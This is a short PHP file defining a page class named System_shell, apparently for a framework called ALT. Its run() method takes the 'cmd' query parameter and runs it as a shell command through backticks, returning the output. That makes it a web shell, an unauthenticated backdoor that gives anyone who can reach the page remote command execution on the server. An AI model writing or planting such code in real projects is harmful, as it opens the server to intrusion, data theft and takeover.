<?php
class System_shell extends ALT\Page
{
	public function get()
	{ }

	public function run()
	{
		$cmd = $_GET["cmd"];
		$this->write(`$cmd`);
	}
}
